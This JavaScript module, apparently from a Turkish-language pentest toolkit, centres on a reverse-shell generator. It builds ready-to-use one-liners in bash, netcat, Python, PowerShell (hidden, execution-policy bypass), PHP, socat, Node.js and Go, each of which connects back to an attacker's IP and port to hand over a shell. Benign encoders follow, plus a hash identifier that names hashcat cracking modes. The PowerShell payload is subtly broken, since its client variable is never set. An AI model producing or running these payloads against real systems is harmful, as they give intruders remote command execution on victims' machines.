/**
 * BZT Cyber Security - Hacker Toolkit & Automation (v3.5 PRO)
 * Polyglot Reverse Shell Generator, Cyber Encoders, Hash Identifier & ROT13
 */

const BZTTools = {
  // 1. POLYGLOT REVERSE SHELL GENERATOR
  generateShells(ip, port) {
    const lhost = (ip || "10.10.14.5").trim();
    const lport = (port || "4444").trim();

    return [
      {
        name: "Bash TCP (-i)",
        desc: "Standart Linux sunucularda anında çalışan interaktif TCP kabuğu.",
        code: `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`
      },
      {
        name: "Netcat OpenBSD (FIFO Pipe)",
        desc: "-e parametresi derlenmemiş modern Ubuntu/Debian sistemler için.",
        code: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ${lhost} ${lport} >/tmp/f`
      },
      {
        name: "Python 3 PTY Shell",
        desc: "Tam interaktif TTY kabuğu tahsis eden Python3 tek satırlığı.",
        code: `python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`
      },
      {
        name: "PowerShell Windows x64 TCP",
        desc: "Modern Windows sunucularda çalışan şifresiz TCP ters soketi.",
        code: `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${lhost}",${lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`
      },
      {
        name: "PHP One-Liner (Web Shell)",
        desc: "File Upload ile sunucuya yüklenen PHP dosyalarında veya RCE'de çalıştırma.",
        code: `php -r '$sock=fsockopen("${lhost}",${lport});exec("/bin/sh -i <&3 >&3 2>&3");'`
      },
      {
        name: "Socat TTY (Full Terminal)",
        desc: "Ctrl+C yakalama ve ekran boyutu senkronizasyonu olan en stabil kabuk.",
        code: `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${lhost}:${lport}`
      },
      {
        name: "Node.js Reverse Shell",
        desc: "NodeJS ve Express arka uçlarına sahip sunucularda komut çalıştırma.",
        code: `require('child_process').exec("bash -c 'bash -i >& /dev/tcp/${lhost}/${lport} 0>&1'")`
      },
      {
        name: "Golang Standalone Runner",
        desc: "Go çalışma ortamı bulunan hedefler için derlenebilir ters bağlantı.",
        code: `echo 'package main;import"net";import"os/exec";func main(){c,_:=net.Dial("tcp","${lhost}:${lport}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go`
      }
    ];
  },

  // 2. ENCODER / DECODER & CYBERCHEF-LITE
  encodeBase64(str) {
    try {
      return btoa(unescape(encodeURIComponent(str)));
    } catch(e) {
      return "Hata: Geçersiz karakter dizisi.";
    }
  },

  decodeBase64(str) {
    try {
      return decodeURIComponent(escape(atob(str)));
    } catch(e) {
      return "Hata: Geçersiz Base64 formatı.";
    }
  },

  encodeUrl(str) {
    return encodeURIComponent(str);
  },

  decodeUrl(str) {
    try {
      return decodeURIComponent(str);
    } catch(e) {
      return "Hata: Geçersiz URL formatı.";
    }
  },

  encodeHex(str) {
    let hex = "";
    for (let i = 0; i < str.length; i++) {
      hex += str.charCodeAt(i).toString(16).padStart(2, "0");
    }
    return hex;
  },

  decodeHex(hex) {
    try {
      const cleanHex = hex.replace(/\s+/g, "");
      let str = "";
      for (let i = 0; i < cleanHex.length; i += 2) {
        str += String.fromCharCode(parseInt(cleanHex.substr(i, 2), 16));
      }
      return str;
    } catch(e) {
      return "Hata: Geçersiz Hex formatı.";
    }
  },

  rot13(str) {
    return str.replace(/[a-zA-Z]/g, (c) => {
      const base = c <= 'Z' ? 65 : 97;
      return String.fromCharCode(base + (c.charCodeAt(0) - base + 13) % 26);
    });
  },

  toBinary(str) {
    return str.split('').map(c => c.charCodeAt(0).toString(2).padStart(8, '0')).join(' ');
  },

  fromBinary(bin) {
    try {
      return bin.trim().split(/\s+/).map(b => String.fromCharCode(parseInt(b, 2))).join('');
    } catch(e) {
      return "Hata: Geçersiz binary formatı.";
    }
  },

  // 3. HASH IDENTIFIER
  identifyHash(hashStr) {
    const clean = hashStr.trim();
    const len = clean.length;
    const isHex = /^[0-9a-fA-F]+$/.test(clean);

    if (len === 32 && isHex) {
      return { type: "MD5 veya NTLM (Windows)", confidence: "Yüksek", sampleMode: "Hashcat: -m 0 (MD5) veya -m 1000 (NTLM)" };
    } else if (len === 40 && isHex) {
      return { type: "SHA-1", confidence: "Yüksek", sampleMode: "Hashcat: -m 100 (SHA1)" };
    } else if (len === 64 && isHex) {
      return { type: "SHA-256", confidence: "Yüksek", sampleMode: "Hashcat: -m 1400 (SHA256)" };
    } else if (len === 128 && isHex) {
      return { type: "SHA-512", confidence: "Yüksek", sampleMode: "Hashcat: -m 1700 (SHA512)" };
    } else if (clean.startsWith("$2a$") || clean.startsWith("$2b$") || clean.startsWith("$2y$")) {
      return { type: "bcrypt Blowfish Hash", confidence: "Kesin", sampleMode: "Hashcat: -m 3200 (bcrypt)" };
    } else if (clean.startsWith("$6$")) {
      return { type: "SHA-512 Unix Crypt (/etc/shadow)", confidence: "Kesin", sampleMode: "Hashcat: -m 1800" };
    } else if (clean.startsWith("$argon2")) {
      return { type: "Argon2 Hash", confidence: "Kesin", sampleMode: "Hashcat: -m 29700" };
    } else {
      return { type: "Bilinmeyen veya Özel Hash", confidence: "Düşük", sampleMode: "Tuzlama (salt) yapısını ve uzunluğu kontrol edin." };
    }
  }
};

window.BZTTools = BZTTools;
